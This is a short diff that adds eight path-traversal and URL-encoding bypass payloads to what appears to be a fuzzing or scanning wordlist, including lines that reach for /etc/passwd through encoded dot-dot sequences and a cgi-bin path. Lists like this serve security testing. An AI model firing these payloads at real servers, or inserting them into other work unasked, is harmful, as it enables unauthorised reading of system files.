@@ -1,0 +1,8 @@
+%2e%2e//google.com
+%ff
+%2e%2e;/test
+%3f/
+%C0%AE%C0%AE%C0%AF
+.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..;/
+cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
